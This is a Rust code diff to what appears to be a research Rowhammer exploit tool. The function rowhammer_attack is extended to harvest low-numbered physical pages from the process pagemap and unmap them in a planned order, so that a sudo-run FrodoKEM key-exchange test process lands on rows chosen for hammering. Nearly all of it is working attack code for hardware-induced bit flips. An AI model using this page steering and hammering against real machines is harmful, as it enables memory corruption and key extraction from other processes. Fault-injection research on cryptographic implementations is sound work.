@@ -14,11 +14,13 @@ use nix::{
     sys::mman::munmap,
     unistd::{fork, ForkResult, Pid},
 };
+use procfs::process::Process;
 
 use crate::profiler::{
     pagefinder::{get_candidate_pages, PageCandidate},
     utils::{
-        self, collect_pages_by_row, fill_memory, get_block_by_order, rowhammer, setup_mapping,
+        self, collect_pages_by_row, fill_memory, get_block_by_order, get_page_frame_number,
+        rowhammer, setup_mapping,
     },
 };
 
@@ -53,7 +55,7 @@ fn get_page_pfns(input_path: impl AsRef<Path>) -> Result<(u64, (u64, u64), (u64,
     Err(String::from("Couldnt parse pfns from file"))
 }
 
-fn rowhammer_attack(hammer: bool, pages: Vec<PageCandidate>) {
+fn rowhammer_attack(hammer: bool, pages: Vec<PageCandidate>, number_of_dummy_pages: usize) {
     println!("Initializing pages for attack.");
 
     for page in &pages {
@@ -71,9 +73,29 @@ fn rowhammer_attack(hammer: bool, pages: Vec<PageCandidate>) {
         }
     }
 
+    let pagemap = &mut Process::myself()
+        .expect("Couldn't get process info")
+        .pagemap()
+        .expect("Couldn't get pagemap of process");
     let mut block_mapping = get_block_by_order(12);
 
-    println!("Starting attack");
+    println!("Preparing dummy pages...");
+
+    // A vec of tuples containing (virtual_address, page_frame_number)
+    let mut dummy_pages = Vec::with_capacity(2 * number_of_dummy_pages);
+    for i in 0.. {
+        let virtual_addr = unsafe { block_mapping.as_mut_ptr().add(i * utils::PAGE_SIZE) };
+        let pfn = get_page_frame_number(pagemap, virtual_addr)
+            .expect("Couldn't get pfn of allocated page");
+        if pfn <= 0x100000 {
+            dummy_pages.push((virtual_addr, pfn));
+        }
+        if dummy_pages.len() >= 2 * number_of_dummy_pages {
+            break;
+        }
+    }
+
+    println!("Starting attack!");
     io::stdout().flush().unwrap();
 
     match unsafe { fork() } {
@@ -93,16 +115,11 @@ fn rowhammer_attack(hammer: bool, pages: Vec<PageCandidate>) {
 
             // Unmap all allocated pages to make room for the FrodoKEM process
             // Check if works with block_mapping len or if we need STACK_SIZE TODO!
-            let ptr = block_mapping.as_mut_ptr();
-            for offset in (0..block_mapping.len() / 2).step_by(utils::PAGE_SIZE) {
+            for (v_addr, _) in &dummy_pages[0..number_of_dummy_pages] {
                 unsafe {
-                    munmap(
-                        ptr.add(offset) as *mut c_void,
-                        utils::PAGE_SIZE,
-                    )
-                    .expect(&format!(
-                        "Address: {:?} should be mapped",
-                        ptr.add(offset)
+                    munmap(*v_addr as *mut c_void, utils::PAGE_SIZE).expect(&format!(
+                        "Tried to unmap {:?} but it was not mapped!",
+                        v_addr
                     ));
                 }
             }
@@ -110,26 +127,25 @@ fn rowhammer_attack(hammer: bool, pages: Vec<PageCandidate>) {
             for page in &pages {
                 unsafe {
                     munmap(page.target_page.virt_addr as *mut c_void, utils::PAGE_SIZE).expect(
-                        &format!("Address: {:?} should be mapped", page.target_page.virt_addr),
+                        &format!(
+                            "Tried to unmap {:?} but it was not mapped!",
+                            page.target_page.virt_addr
+                        ),
                     );
                 }
             }
 
-            for offset in (block_mapping.len() / 2..block_mapping.len()).step_by(utils::PAGE_SIZE) {
+            for (v_addr, _) in &dummy_pages[number_of_dummy_pages..] {
                 unsafe {
-                    munmap(
-                        ptr.add(offset) as *mut c_void,
-                        utils::PAGE_SIZE,
-                    )
-                    .expect(&format!(
-                        "Address: {:?} should be mapped",
-                        ptr.add(offset)
+                    munmap(*v_addr as *mut c_void, utils::PAGE_SIZE).expect(&format!(
+                        "Tried to unmap {:?} but it was not mapped!",
+                        v_addr
                     ));
                 }
             }
 
             let ok = Command::new("sudo")
-                .arg("../Frodo/PQCrypto-LWEKE/frodo640/test_KEM > vic.out")
+                .arg("/home/development/Frodo/PQCrypto-LWEKE/frodo640/test_KEM > vic.out")
                 .status()
                 .expect("failed to execute command");
 
@@ -163,10 +179,9 @@ fn rowhammer_attack(hammer: bool, pages: Vec<PageCandidate>) {
 
             // Set values to allocated memory before attacking
             // Check if works with block_mapping len or if we need STACK_SIZE TODO!
-            let ptr = block_mapping.as_mut_ptr();
-            for offset in (0..block_mapping.len() / 2).step_by(utils::PAGE_SIZE) {
+            for (v_addr, _) in &dummy_pages[0..number_of_dummy_pages] {
                 unsafe {
-                    *ptr.add(offset) = (pages.len() + offset) as u8 & 0xFF;
+                    **v_addr = (pages.len() + *v_addr as usize) as u8 & 0xFF;
                 }
             }
 
@@ -180,9 +195,9 @@ fn rowhammer_attack(hammer: bool, pages: Vec<PageCandidate>) {
                 }
             }
 
-            for offset in (block_mapping.len() / 2..block_mapping.len()).step_by(utils::PAGE_SIZE) {
+            for (v_addr, _) in &dummy_pages[number_of_dummy_pages..] {
                 unsafe {
-                    *ptr.add(offset) = (pages.len() + offset) as u8 & 0xFF;
+                    **v_addr = (pages.len() + *v_addr as usize) as u8 & 0xFF;
                 }
             }
 
@@ -201,7 +216,12 @@ fn rowhammer_attack(hammer: bool, pages: Vec<PageCandidate>) {
     println!("Done with attack");
 }
 
-pub(crate) fn main(fraction_of_phys_memory: f64, dimms: u8, testing: bool) {
+pub(crate) fn main(
+    fraction_of_phys_memory: f64,
+    dimms: u8,
+    testing: bool,
+    number_of_dummy_pages: usize,
+) {
     let row_size = 128 * 1024 * dimms as usize;
     let mut mmap = setup_mapping(0.0);
 
@@ -224,7 +244,7 @@ pub(crate) fn main(fraction_of_phys_memory: f64, dimms: u8, testing: bool) {
     }
 
     println!("Setting up memory mapping...");
-    let (pagemap, pages_by_row, victims) = loop {
+    let (_, pages_by_row, victims) = loop {
         std::mem::drop(mmap);
         mmap = setup_mapping(fraction_of_phys_memory);
 
@@ -236,8 +256,6 @@ pub(crate) fn main(fraction_of_phys_memory: f64, dimms: u8, testing: bool) {
                 "[!] Can't hammer rows - only got {} rows total. Make sure you're running as sudo!",
                 pages_by_row.len()
             );
-
-            ()
         }
 
         let victims = get_candidate_pages(&pages_by_row, &victim_pages);
@@ -250,7 +268,7 @@ pub(crate) fn main(fraction_of_phys_memory: f64, dimms: u8, testing: bool) {
         break (mmap, pages_by_row, victims);
     };
 
-    let mut indices = (0..pages_by_row.len() - 2).collect::<Vec<_>>();
+    let indices = (0..pages_by_row.len() - 2).collect::<Vec<_>>();
 
     'main: for above_row_index in indices {
         let target_row_index = above_row_index + 1;
@@ -268,7 +286,7 @@ pub(crate) fn main(fraction_of_phys_memory: f64, dimms: u8, testing: bool) {
         }
     }
 
-    rowhammer_attack(hammer, victims);
+    rowhammer_attack(hammer, victims, number_of_dummy_pages);
 
     println!("Done with attack");
 }
